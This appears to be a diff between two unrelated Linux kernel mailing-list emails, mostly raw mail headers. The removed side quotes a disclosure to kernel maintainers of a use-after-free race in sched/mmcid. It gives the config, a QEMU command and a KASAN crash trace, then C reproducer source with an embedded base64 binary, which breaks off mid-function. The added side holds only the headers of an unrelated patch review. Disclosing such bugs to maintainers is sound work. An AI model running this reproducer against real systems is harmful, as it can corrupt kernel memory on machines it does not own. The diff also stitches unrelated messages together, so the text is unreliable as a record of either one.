@@ -1,100 +1,80 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.218.51
-ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
-	t=1795541294;
-	b=J7UvtxeK8b3JyER8DgSgjMKiDZMNKnRA/jSOe6VkZprQqYbu+JW/tAfYorg2pS4jUITe
-	 ZuDGP4f7FS+LL6gs7aVRgVD4dVCEiFxTcBRU/0jyFBmFFUVz+SVuyax88yAHIkOmfoBIm
-	 v39D+qnhGNQwU9k8TUvBNHDvmXAWEcI1UrHwbSxHOr7UWxFDwAwCsjyXOMOl+44v1wogc
-	 iOC6rwRv0CbNvX6tC7N1E5zKgGlH6ehgU0aWBRL18ZDh5x4hf0Zl6jlfb0Q7yDHBAmYlm
-	 Y1vu6R8nosC5x2w7zcCIvP2BT2V31KZNAvhg7glepMhflTd6n0C6nomEIj0W7dnkH7A==
-ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795541294;
-	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
-	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
-	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
-	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
-	bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
-	b=HIpdYTjIaa4VwQKlRAr1ewhJT8ByPF+9hSZ6/C6EmijVOorMQkYft7QYRap8bAevNCYI
-	 UFl1TTQ+yxNXcURvLj/EjlvDm2D+P9lztakR0Ek2n2BAyOVIyfNRoSYRYTVPHEog/o4N2
-	 eyiWIi4NCIE8U2BT9PdzQvExH2ShtmgKuB7I7zB3lCCW52O2dq0oo/cDxtwqAiVL5vXzd
-	 563we4pBqdYHJfef6LLn0F8Hc/RvPpbJxn0vEmHiYaQ0v09LSY4twxxU4yfzui8o+Fnek
-	 Nf4/eHKNWp+aM5aLB8n+0P/jBZkY/PdgayHvx6MAbmsQNZj36UbPnuacJyQv9TXzKmg==
-ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=gmail.com;
-	spf=pass smtp.mailfrom=gmail.com;
-	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=c7RXiIEX;
-	arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.218.51
-Received: from mail-ej1-f51.google.com (mail-ej1-f51.google.com [209.85.218.51])
-	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
-	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=192.198.163.8
+ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
+	t=1795541305;
+	b=oMsiMi80myHiaVuxGHISibFz3h/yRVxncfkscsh6fBGry+numWzqQbOh7toKon5TSfd3
+	 sSBIwhidLFkWkLCHpluMcSW9Xec54pXONltaGsOSlIi3/G2oW+xPLDzWHWFTsYcE8T4s5
+	 3lx1cLTpvXnD37BXiyEcw2TvjPrYcfghIijejDshUmMfwpcj8dErdgEcyMcxmkcbPrC8v
+	 uaB/0ZlMS3l7ru4ZC2lSDJi8ORvC9XahsxcR2Qoh2nDL3/cjyYT41lpPtNCNhyA9Me2eD
+	 hLB/lhuA+kuKd5k+A+8I3vNciCdMoq3SnRuUojgPFussu3yoNjmyQumqYCXinOT6x5g==
+ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1795541305;
+	h=DMARC-Filter:DKIM-Signature:X-CSE-ConnectionGUID:X-CSE-MsgGUID:
+	 X-IronPort-AV:X-IronPort-AV:Received:X-CSE-ConnectionGUID:
+	 X-CSE-MsgGUID:X-ExtLoop1:X-IronPort-AV:Received:Date:From:To:Cc:
+	 Subject:Message-ID:References:MIME-Version:Content-Type:
+	 Content-Disposition:In-Reply-To:Organization;
+	bh=ffsNDG7rZ5R0j2yxFNZp26tEKpogV1MBod4g8hnw9Qk=;
+	b=wkmXMBbxKkeT/EtVzAgqJY2nZ6xkvB0X0hjz0cafb7FYzHhcI3tZv0icNQ2lSoQ3dspg
+	 gLKs5DquLEz9qjomZmCR35HS9pKVuShRaCVXMFfiIqdv/m7VKpITMt2mTflBw8mwkPEru
+	 jr391gDZ7PNKMG9UnVZYuL6uxTJhXqlmuEK8AUZHypXas7PHpCbzO4FkdRqn3DjRFegqU
+	 PgCvvB0lGowcohA/aolc1acTMf0f6/W64nDe2gj5pTXBrLmknkoep//QWnhzeS97e46Zv
+	 pt1uQ1JyJVr7i0dzaUoC31b9ccLNpFtdN8U5ssQaRn7B9gAR4RrikvXdwI70jBagVFQ==
+ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
+	dmarc=pass header.from=intel.com;
+	spf=pass smtp.mailfrom=intel.com;
+	dkim=pass header.d=intel.com header.i=@intel.com header.a=rsa-sha256 header.s=Intel header.b=aX5e4SfQ;
+	arc=none smtp.remote-ip=192.198.163.8
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.8])
+	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E421D606A33B
-	for <linux-kernel@vger.kernel.org>; Tue, 24 Nov 2026 17:28:13 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org E421D606A33B
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C883E606A333;
+	Tue, 24 Nov 2026 17:28:24 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org C883E606A333
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=c7RXiIEX
-Received: by mail-ej1-f51.google.com with SMTP id a640c23a62f3a-c51a02ad3acso70024966b.1
-        for <linux-kernel@vger.kernel.org>; Tue, 24 Nov 2026 09:28:13 -0800 (PST)
-ARC-Seal: i=1; a=rsa-sha256; t=1795541292; cv=none;
-        d=google.com; s=arc-20260327;
-        b=HyZvR982qoiS/fcRdcyroRh+FlFpoEumEcb7hcpUsfoi7u8dl+HWtRhBuGGqqJktRX
-         REEKMxubgNpEuMThu/DazuE48a9MUdLzxUqjLlmdF5d4ioE8fezapkwWY65zDEwKJf3t
-         nJjj4eZXg+sHAAMFnodXjEbJw6o3DgJJq5jtazEfFmn27i3+exPgF6COGeGeOtxN7HN0
-         YbFYRatqweXPZGbPv6L819RvXQkQPJTbmzGa5HZWKhCYWBk61RCEzfcWcxD651jHaEiH
-         U6zvWLWLR2UOLpGBmv6buGnRoC8OEEQdGZEDrwCD0AMaVv6vXQVVj2sMzDOJqdVW36Rp
-         qWbw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
-        fh=9Z139lFv9l+h9Yyava1NEw0H4X9+YjAkK83rnNBk32E=;
-        b=JRc9MJFCV9cOdJarGaMUoJ+QqfY5SBXXOuPbtnBYTiTIUmFBkKtLdHa/eLpWuK+3zs
-         kLnl2riZKemXfFzCTEF2KB4e2pp2ucAQZWAdcghV1haygMpv43h9ppW66gWmmfYJFevU
-         FV0QS7ekAYGp4V35679gX0T2vb0PgoIelYEckpBbm42RWCwP/VB/Iy6VK0e3JgsHTXRs
-         EgfxZOCbFmI6ilNQ9wLGtCgMWaSKTLBvzBWd3D6hmLqGulk8rrn4XjC/aXr/yPst+WzQ
-         ogrIi7aEivdIiGlreCzaBSRDsLG+5602Z5sp+Twj14UY21OqYZIXZB30k8jkCTSl9gf8
-         wrCw==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20260707; t=1795541292; x=1796146092; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
-        b=c7RXiIEXQwMv8ge3/dEYuLK+3kGe8XSS5UJZS8eVBqt3DOry+ubPnl5WM04EAnsLGC
-         lW4WzVNgawFvQzLigOwUKDHqyYy4xA8kW1LGXs5ieCbAVkfJmR65KtJPCUyawgTZWxAo
-         YkoLm6Ed8yQmHUYbd0YGZsu7XsRStTV1bv692igh38yrRUInFWUIVcCn7a6gC3SnNu50
-         /C37IK1+DhuVCYIIypJoVTExbCrkLUkCiYk9cQi/YRuWNli11dKw3mrkz6qda0yrbh32
-         bQzQBvJevoFTu2beDSD3qZs5qkNV0DZWb66RpulmoUZSPF3Bt/wZqQVR7sqOln4qA+3p
-         Zsgg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1795541292; x=1796146092;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
-        b=InoGOIiNIJP4ivOPgCae0Pgyt7aAaub4p1O5FBlBhXptRPmigxz7xwDhlcOnUJWMvU
-         Y+3JKU+lVWYTcBUQbsBa9CZgi4p9hyj+pIrUYF1MlyZyDH9h2UjtGWgvzAbxjilChzwe
-         jj6vJXzlHt/zev+B1x5Vxnd55iUB5cbnuPZxda07NB4PN0R/aDnRqsgG4pyr9tptqT0Y
-         vOoD00x0i8arz/TsUzW0OcHcAujwkIjaWGjtzNV2ZHPFLMyAYNLENGYY/wfrkrKpKMpm
-         aXihfRb9iM3M0hx5D3sxoTktqNxdV5zDJtEmSwZwFx9wFgVfaee2D8kIymZVtoybr3G3
-         xVjw==
-X-Forwarded-Encrypted: i=1; AL+hErFPDY8koDocfRvC3UVtwyJ6qk04Orn9tfBpWBUUZ/XK4g8280BKisVI3zasajuA5LKTmM/+e+77vEcecok=@vger.kernel.org
-X-Gm-Message-State: APuU4Z/c+xJ5iAKIOQr2CQzy1hiOqLO2RL9Ek0SVmPoWlCR9kFV9NJmx
-	IYdLfWdoWph6OpcpGbMgfOP3BDKDsMBZyRPyszC7j73COZwJ1zTocumdzHiHOgY5laQIOo7etTv
-	936/Apy1+adUS0J+EgovRBWc4TnIDe4g=
-X-Gm-Gg: AZFdTZfT5zSnCF95f0MnQ3GUUpQSI6TjPopgWCoCVFOZ3wzBglcd3pbt1lBuL3i9dB9
-	80CZ+St1WfmuafgS910c1rs2ywBrucO8j7otxFRlnxNRADqh3dICLTelvt090ed/FLwsjGzzzws
-	xfB/FMqmvbKQ6/lfO2AiCl0PSLOqZIAjJbOg5N88P/5DJ4cEpb+aqYwqClBCFfRSjTB1fXIoNg+
-	uB0pKyQs2dqkbOq9ckWQCPX8ArnvEfW3SV9RJcydGHkG00nqwBUnRUshU8n/L2/ert8jp1iE87+
-	mEuPoDtDbhryxabi+pqzpdlalZ+12p4Lk+fZVBhNCJP2dv1qLyOfdHfou++D8u3AmCA/nU3Z+CP
-	RZS1p217cpH7dHAX3DLg7DvXUY6YU9XLsp55jwM4oTU7amNPcM6tvz//IcCcSbpQ0dbtglA==
-X-Received: by 2002:a17:906:da0e:b0:c50:5186:6dc2 with SMTP id
- a640c23a62f3a-c513a84a4b7mr898157466b.24.1795541291905; Tue, 24 Nov 2026
- 09:28:11 -0800 (PST)
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.a=rsa-sha256 header.s=Intel header.b=aX5e4SfQ
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+  t=1795541305; x=1827077305;
+  h=date:from:to:cc:subject:message-id:references:
+   mime-version:in-reply-to;
+  bh=yJAlPXvrI00wm1acbN/uJcwx38S8ia1++yAKKe9BDs8=;
+  b=aX5e4SfQyTJoAXi1Sq/jtTcvM+9J5RMTD4hrHPDVOBLf3oKSEbH69oCJ
+   oOxQdMmZkT0zUEF9EXWHMKQSzs3v1ELqmFe+N0yraWjhlH+EG8aowb/y0
+   SxqctrL9xRn5lwH0LiJhXVWLV2hUF+x2JCJ+6pcc/fNyc3U/uYe2FENbW
+   /2RB026nNGigjjE/VUTfW9RNaElf7TntNiWIm/RAc91AHll0BRgVgf4gG
+   j0DHBO7EG9BSGpJ3cYXJ1jcgdA1++v1LOjjH8WLdlzQR3W80L3dvyUb5M
+   1LGSadyd+qGZWewMkVKP9OGh6bBs7EXFxI84R1lid2eT+T2MpCLqCYPQS
+   g==;
+X-CSE-ConnectionGUID: kY7K2RxtT0uJeorGU0KWtg==
+X-CSE-MsgGUID: iMp6MvcrQ9um1czvgEbvPA==
+X-IronPort-AV: E=McAfee;i="6800,10657,11976"; a="4284891"
+X-IronPort-AV: E=Sophos;i="6.27,231,1787036400"; 
+   d="scan'208";a="4284891"
+Received: from orviesa003.jf.intel.com ([10.64.159.143])
+  by fmvoesa102.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 24 Nov 2026 09:17:36 -0800
+X-CSE-ConnectionGUID: aZ0oM0a1TjiludAUk2BVKw==
+X-CSE-MsgGUID: XxGUKT6tR6GrVQVSHMwkSw==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.27,231,1787036400"; 
+   d="scan'208";a="11497087"
+Received: from hrotuna-mobl2.ger.corp.intel.com (HELO localhost) ([10.245.245.125])
+  by smtpauth.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 24 Nov 2026 09:17:33 -0800
+Date: Tue, 24 Nov 2026 19:17:30 +0200
+From: Andy Shevchenko <andriy.shevchenko@intel.com>
+To: Abhishek Chaulagain <chaulagainavishek14@gmail.com>
+Cc: Hans de Goede <hansg@kernel.org>,
+	Mauro Carvalho Chehab <mchehab@kernel.org>,
+	Andy Shevchenko <andy@kernel.org>,
+	Sakari Ailus <sakari.ailus@linux.intel.com>,
+	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
+	linux-media@vger.kernel.org, linux-staging@lists.linux.dev,
+	linux-kernel@vger.kernel.org
+Subject: Re: [PATCH v2] media: atomisp: Remove unused timed controller code
+Message-ID: <awXGquBiO15OWx1-@ashevche-desk.local>
+References: <20261123200658.449-1-chaulagainavishek14@gmail.com>
+ <20261124164504.443-1-chaulagainavishek14@gmail.com>
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Post: <mailto:linux-kernel@vger.kernel.org>
@@ -104,783 +84,35 @@ List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-References: <20261110183809.3308868-1-bestswngs@gmail.com> <20261110183809.3308868-2-bestswngs@gmail.com>
- <3d4c5808-dff4-4d5d-aab3-684eb8a9139b@efficios.com>
-In-Reply-To: <3d4c5808-dff4-4d5d-aab3-684eb8a9139b@efficios.com>
-From: Weiming Shi <bestswngs@gmail.com>
-Date: Tue, 24 Nov 2026 09:27:34 -0800
-X-Gm-Features: Aa3M54rf5Ot-8KPAbMAj1Dp2BZXpb3N_CUZJrtz2hUjizqZ6wSfR37UszFqRCEw
-Message-ID: <CANgPUi2EtQxVR71WMPx3mQ+wrPwW1OC6CwOht1YK=E_quTHrhQ@mail.gmail.com>
-Subject: Re: [PATCH v3] sched/mmcid: Synchronize MM teardown with affinity updates
-To: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
-Cc: Kees Cook <kees@kernel.org>, Alexander Viro <viro@zeniv.linux.org.uk>, 
-	Christian Brauner <brauner@kernel.org>, Jan Kara <jack@suse.cz>, Ingo Molnar <mingo@redhat.com>, 
-	Peter Zijlstra <peterz@infradead.org>, Juri Lelli <juri.lelli@redhat.com>, 
-	Vincent Guittot <vincent.guittot@linaro.org>, Dietmar Eggemann <dietmar.eggemann@arm.com>, 
-	Steven Rostedt <rostedt@goodmis.org>, Ben Segall <bsegall@google.com>, Mel Gorman <mgorman@suse.de>, 
-	Valentin Schneider <vschneid@redhat.com>, K Prateek Nayak <kprateek.nayak@amd.com>, 
-	Thomas Gleixner <tglx@kernel.org>, linux-mm@kvack.org, linux-fsdevel@vger.kernel.org, 
-	linux-kernel@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20261124164504.443-1-chaulagainavishek14@gmail.com>
+Organization: Intel Finland Oy - BIC 0357606-4 - c/o Alberga Business Park, 6
+ krs, Bertel Jungin Aukio 5, 02600 Espoo
 
-Mathieu Desnoyers <mathieu.desnoyers@efficios.com> =E4=BA=8E2026=E5=B9=B411=
-=E6=9C=8810=E6=97=A5=E5=91=A8=E4=BA=8C 10:46=E5=86=99=E9=81=93=EF=BC=9A
->
-> +CC tglx.
->
-> On 2026-11-10 13:38, Weiming Shi wrote:
-> > Hi,
-> >
-> > Here is a standalone reproducer for the p->mm lifetime race.
-> >
-> > The tested kernel was commit 05441d697f7f9a927264f4058cbbc6a03dfcac9d
-> > with:
-> >
-> > ```
-> > CONFIG_SMP=3Dy
-> > CONFIG_EXPERT=3Dy
-> > # CONFIG_FUTEX is not set
-> > CONFIG_RSEQ=3Dy
-> > CONFIG_SCHED_MM_CID=3Dy
-> > CONFIG_KASAN=3Dy
-> > CONFIG_KASAN_GENERIC=3Dy
-> > CONFIG_KASAN_INLINE=3Dy
-> > CONFIG_DEBUG_INFO=3Dy
-> > ```
-> >
-> > KASAN and DEBUG_INFO produce and decode the report. The vulnerable path
-> > requires CONFIG_SCHED_MM_CID=3Dy. This exec manifestation also requires
-> > CONFIG_FUTEX=3Dn because futex_exec_done() otherwise serializes old-MM =
-teardown
-> > with the p->pi_lock held by the affinity updater.
-> >
-> > Dependencies and scheduling setup:
-> >
-> > - x86-64 Linux guest with at least four online CPUs;
-> > - gcc and glibc in the guest to build the PoC;
-> > - sched_setaffinity(), memfd_create(), and execveat() available;
-> > - eight guest vCPUs scheduled on four host CPUs for the tested 2:1 over=
-commit;
-> > - UID/GID 65534 for the tested run.
-> >
-> > Host command:
-> >
-> > ```
-> > taskset -c 0-3 qemu-system-x86_64 \
-> >      -accel kvm -machine q35 -cpu max -m 8G -smp 8 \
-> >      -kernel bzImage -initrd initramfs.cpio.gz \
-> >      -append "console=3DttyS0 rdinit=3D/init nokaslr panic_on_warn=3D1 =
-panic=3D-1" \
-> >      -nographic -no-reboot
-> > ```
-> >
-> > Build and run inside the guest:
-> >
-> > ```
-> > gcc -O3 -Wall -Wextra -o poc poc.c
-> > ./poc 180
-> > ```
-> >
-> > The reproducer works as follows:
-> >
-> > 1. It decodes an embedded 848-byte ET_EXEC image into a memfd.
-> > 2. The victim initially pins itself to the penultimate guest CPU. The s=
-etters
-> >     then alternate its affinity between that CPU alone and the last two=
- guest
-> >     CPUs while it repeatedly executes the memfd with execveat(AT_EMPTY_=
-PATH).
-> > 3. Up to six same-UID setter processes run on the other CPUs and altern=
-ate the
-> >     victim between one- and two-CPU affinity masks.
-> > 4. A 31-us periodic userspace SIGALRM provides interrupt pressure.
-> > 5. Host CFS overcommit can deschedule a setter after it loads the
-> >     victim's old p->mm. The victim can then complete setup_new_exec() a=
-nd free
-> >     that old mm before the setter reaches mm_update_cpus_allowed().
-> >
-> > The PoC counts syscall attempts, successful affinity updates, errors, a=
-nd
-> > completed victim execs separately. Every ten-second window must contain=
- both
-> > a successful affinity update and victim exec progress. It checks for an=
- early
-> > victim or setter exit, and a clean result requires successful child sta=
-tuses.
-> >
-> > This is a stochastic race. The progress-checking version reported the U=
-AF
-> > after about 52.60 seconds. The last completed ten-second window before =
-the
-> > crash recorded 2,096,128 successful affinity updates, zero errors, and =
-18,975
-> > completed execs:
-> >
-> > ```
-> > BUG: KASAN: slab-use-after-free in set_cpus_allowed_common
-> > Read of size 4 at addr ffff888123155e4c by task poc/5132
-> > CPU: 4 UID: 65534 PID: 5132 Comm: poc
-> >
-> > Call Trace:
-> >   set_cpus_allowed_common             kernel/sched/core.c:10835
-> >   set_cpus_allowed_fair               kernel/sched/fair.c:10046
-> >   __set_cpus_allowed_ptr_locked       kernel/sched/core.c:3224
-> >   __set_cpus_allowed_ptr              kernel/sched/core.c:3258
-> >   __sched_setaffinity                 kernel/sched/syscalls.c:1161
-> >   sched_setaffinity                   kernel/sched/syscalls.c:1239
-> >   __x64_sys_sched_setaffinity         kernel/sched/syscalls.c:1275
-> >   do_syscall_64                       arch/x86/entry/syscall_64.c:84
-> >   entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
-> >
-> > Freed by task 5127:
-> >   kmem_cache_free                     mm/slub.c:6757
-> >   __mmput                             kernel/fork.c:1204
-> >   mmput                               kernel/fork.c:1215
-> >   setup_new_exec                      fs/exec.c:1395
-> >   load_elf_binary                     fs/binfmt_elf.c:1024
-> >   bprm_execve                         fs/exec.c:1865
-> >   do_execveat_common.isra.0           fs/exec.c:1963
-> >   __x64_sys_execveat                  fs/exec.c:2047
-> >   do_syscall_64                       arch/x86/entry/syscall_64.c:84
-> >   entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
-> > ```
-> >
-> > Complete PoC:
-> >
-> > ```c
-> > /*
-> >   * Standalone reproducer for the sched/mmcid p->mm UAF.
-> >   *
-> >   * Build: gcc -O3 -o poc poc.c
-> >   * Run:   taskset -c 0-3 qemu-system-x86_64 ... -smp 8 ...
-> >   * Guest: ./poc [seconds]
-> >   *
-> >   * The tiny self-exec victim is embedded below and executed from memfd=
-.  The
-> >   * tested VM used CONFIG_SCHED_MM_CID=3Dy, CONFIG_FUTEX=3Dn and 2:1 vC=
-PU
-> >   * overcommit (8 vCPUs on 4 host CPUs).
-> >   */
-> > #define _GNU_SOURCE
-> > #include <errno.h>
-> > #include <fcntl.h>
-> > #include <poll.h>
-> > #include <sched.h>
-> > #include <signal.h>
-> > #include <stdint.h>
-> > #include <stdio.h>
-> > #include <stdlib.h>
-> > #include <string.h>
-> > #include <sys/eventfd.h>
-> > #include <sys/mman.h>
-> > #include <sys/prctl.h>
-> > #include <sys/stat.h>
-> > #include <sys/syscall.h>
-> > #include <sys/time.h>
-> > #include <sys/types.h>
-> > #include <sys/wait.h>
-> > #include <time.h>
-> > #include <unistd.h>
-> >
-> > #define DEFAULT_RUNTIME 180
-> > #define MAX_SETTERS 6
-> > #define READY_FD 3
-> > #define VICTIM_FD 4
-> > #define VICTIM_SIZE 848
-> >
-> > /* 848-byte ET_EXEC produced from victim_min_execfd.S + victim_min.ld. =
-*/
-> > static const char victim_b64[] =3D
-> > "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAsABAAAAAAABAAAAAAAAAABACAAAAAAAAAAAAAE=
-AAOAAC"
-> > "AEAABQAEAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAOAEAAAAAAAA4AQAAAA=
-AAAAAQ"
-> > "AAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-AACAAA"
-> > "AAAAAABJieS4AQAAAL8DAAAASI01VAAAALoIAAAADwVIg/gIdTlMiedIgecAAOD/vgAAQA=
-C4CwAA"
-> > "AA8FuEIBAAC/BAAAAEiNNSgAAABIjRUpAAAARTHSQbgAEAAADwW4PAAAAL9/AAAADwX0kA=
-EAAAAA"
-> > "AAAAAAAAAAAAAAAgAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ=
-AAAAQA"
-> > "8f8AAAAAAAAAAAAAAAAAAAAACgAAAAAAAQAYAUAAAAAAAAAAAAAAAAAADgAAAAAAAQAgAU=
-AAAAAA"
-> > "AAAAAAAAAAAAFAAAAAAAAQAoAUAAAAAAAAAAAAAAAAAAGQAAABIAAQCwAEAAAAAAAGcAAA=
-AAAAAA"
-> > "AHZpY3RpbS5vAG9uZQBlbXB0eQBhcmd2AF9zdGFydAAALnN5bXRhYgAuc3RydGFiAC5zaH=
-N0cnRh"
-> > "YgAuaW1hZ2UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-AAAAAA"
-> > "AAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABwAAAAAAAACwAEAAAAAAALAAAAAAAA=
-AAiAAA"
-> > "AAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAA=
-A4AQAA"
-> > "AAAAAJAAAAAAAAAAAwAAAAUAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAA=
-AAAAAA"
-> > "AAAAyAEAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAA=
-AAAAAA"
-> > "AAAAAAAAAAAAAOgBAAAAAAAAIgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=3D=
-";
-> >
-> > struct setter_stats {
-> >       volatile unsigned long long attempts;
-> >       volatile unsigned long long successes;
-> >       volatile unsigned long long errors;
-> > };
-> >
-> > struct shared_state {
-> >       struct setter_stats setters[MAX_SETTERS];
-> > };
-> >
-> > static int b64_value(unsigned char c)
-> > {
-> >       if (c >=3D 'A' && c <=3D 'Z')
-> >               return c - 'A';
-> >       if (c >=3D 'a' && c <=3D 'z')
-> >               return c - 'a' + 26;
-> >       if (c >=3D '0' && c <=3D '9')
-> >               return c - '0' + 52;
-> >       if (c =3D=3D '+')
-> >               return 62;
-> >       if (c =3D=3D '/')
-> >               return 63;
-> >       return -1;
-> > }
-> >
-> > static int install_victim(void)
-> > {
-> >       unsigned char out[VICTIM_SIZE];
-> >       size_t i, n =3D 0;
-> >       unsigned int acc =3D 0, bits =3D 0;
-> >       int fd;
-> >
-> >       for (i =3D 0; victim_b64[i] && victim_b64[i] !=3D '=3D'; i++) {
-> >               int v =3D b64_value((unsigned char)victim_b64[i]);
-> >
-> >               if (v < 0)
-> >                       continue;
-> >               acc =3D (acc << 6) | (unsigned int)v;
-> >               bits +=3D 6;
-> >               if (bits >=3D 8) {
-> >                       bits -=3D 8;
-> >                       if (n =3D=3D sizeof(out)) {
-> >                               errno =3D EOVERFLOW;
-> >                               return -1;
-> >                       }
-> >                       out[n++] =3D (unsigned char)(acc >> bits);
-> >                       acc &=3D (1U << bits) - 1;
-> >               }
-> >       }
-> >       if (n !=3D sizeof(out)) {
-> >               errno =3D EINVAL;
-> >               return -1;
-> >       }
-> >       fd =3D syscall(SYS_memfd_create, "sched-mmcid-victim", 0);
-> >       if (fd < 0)
-> >               return -1;
-> >       if (fd !=3D VICTIM_FD) {
-> >               if (dup2(fd, VICTIM_FD) < 0) {
-> >                       close(fd);
-> >                       return -1;
-> >               }
-> >               close(fd);
-> >               fd =3D VICTIM_FD;
-> >       }
-> >       if (write(fd, out, n) !=3D (ssize_t)n || fchmod(fd, 0700))
-> >               return -1;
-> >       return 0;
-> > }
-> >
-> > static int install_exec_counter(void)
-> > {
-> >       int fd =3D eventfd(0, EFD_NONBLOCK);
-> >
-> >       if (fd < 0)
-> >               return -1;
-> >       if (fd !=3D READY_FD) {
-> >               if (dup2(fd, READY_FD) < 0) {
-> >                       close(fd);
-> >                       return -1;
-> >               }
-> >               close(fd);
-> >       }
-> >       return 0;
-> > }
-> >
-> > static void pin_self(int cpu)
-> > {
-> >       cpu_set_t mask;
-> >
-> >       CPU_ZERO(&mask);
-> >       CPU_SET(cpu, &mask);
-> >       if (sched_setaffinity(0, sizeof(mask), &mask)) {
-> >               fprintf(stderr, "pin cpu%d: %s\n", cpu, strerror(errno));
-> >               _exit(2);
-> >       }
-> > }
-> >
-> > static void alarm_handler(int sig)
-> > {
-> >       (void)sig;
-> > }
-> >
-> > static void enable_irq_pressure(void)
-> > {
-> >       struct sigaction sa =3D { .sa_handler =3D alarm_handler };
-> >       struct itimerval timer =3D {
-> >               .it_interval =3D { .tv_sec =3D 0, .tv_usec =3D 31 },
-> >               .it_value =3D { .tv_sec =3D 0, .tv_usec =3D 31 },
-> >       };
-> >
-> >       sigemptyset(&sa.sa_mask);
-> >       sa.sa_flags =3D SA_RESTART;
-> >       if (sigaction(SIGALRM, &sa, NULL) ||
-> >           setitimer(ITIMER_REAL, &timer, NULL))
